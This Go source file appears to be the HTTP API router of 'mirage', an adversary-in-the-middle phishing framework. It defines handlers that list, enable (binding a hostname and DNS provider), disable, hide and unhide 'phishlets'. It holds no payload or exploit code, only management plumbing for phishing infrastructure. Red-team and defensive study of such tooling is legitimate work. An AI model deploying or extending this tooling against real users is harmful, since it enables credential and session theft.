package api

import (
	"errors"
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

func (r *Router) getPhishlet(w http.ResponseWriter, req *http.Request) {
	phishlet, err := r.Phishlets.Get(req.PathValue("name"))
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "phishlet not found")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to get phishlet")
		}

		return
	}

	writeJSON(w, http.StatusOK, phishletToResponse(phishlet))
}

func (r *Router) listPhishlets(w http.ResponseWriter, req *http.Request) {
	limit, offset := parsePagination(req)

	phishlets, err := r.Phishlets.List()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to list phishlets")
		return
	}

	page := paginateSlice(phishlets, limit, offset)

	items := make([]sdk.PhishletResponse, len(page))
	for i, phishlet := range page {
		items[i] = phishletToResponse(phishlet)
	}
	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.PhishletResponse]{
		Items:  items,
		Total:  len(phishlets),
		Limit:  limit,
		Offset: offset,
	})
}

func (r *Router) enablePhishlet(w http.ResponseWriter, req *http.Request) {
	name := req.PathValue("name")

	body, ok := decodeAndValidate[sdk.EnablePhishletRequest](w, req)
	if !ok {
		return
	}

	p, err := r.Phishlets.Enable(req.Context(), name, body.Hostname, body.DNSProvider)
	if err != nil {
		switch {
		case errors.Is(err, aitm.ErrHostnameRequired):
			writeError(w, http.StatusUnprocessableEntity, "hostname is required")
		case errors.Is(err, aitm.ErrHostnameConflict):
			writeError(w, http.StatusConflict, "hostname is already in use by another phishlet")
		default:
			writeError(w, http.StatusInternalServerError, "failed to enable phishlet")
		}

		return
	}

	writeJSON(w, http.StatusOK, phishletToResponse(p))
}

func (r *Router) disablePhishlet(w http.ResponseWriter, req *http.Request) {
	p, err := r.Phishlets.Disable(req.Context(), req.PathValue("name"))
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "phishlet does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to disable phishlet")
		}

		return
	}

	writeJSON(w, http.StatusOK, phishletToResponse(p))
}

func (r *Router) hidePhishlet(w http.ResponseWriter, req *http.Request) {
	p, err := r.Phishlets.Hide(req.PathValue("name"))
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "phishlet does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to hide phishlet")
		}

		return
	}

	writeJSON(w, http.StatusOK, phishletToResponse(p))
}

func (r *Router) unhidePhishlet(w http.ResponseWriter, req *http.Request) {
	p, err := r.Phishlets.Unhide(req.PathValue("name"))
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "phishlet does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to unhide phishlet")
		}

		return
	}

	writeJSON(w, http.StatusOK, phishletToResponse(p))
}

// getPhishletHosts returns /etc/hosts lines for a phishlet. Stubbed until
// the PhishletResolver is wired into the Router.
func (r *Router) getPhishletHosts(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
}

func phishletToResponse(p *aitm.Phishlet) sdk.PhishletResponse {
	return sdk.PhishletResponse{
		Name:        p.Name,
		BaseDomain:  p.BaseDomain,
		Hostname:    p.Hostname,
		DNSProvider: p.DNSProvider,
		SpoofURL:    p.SpoofURL,
		Enabled:     p.Enabled,
		Hidden:      p.Hidden,
	}
}
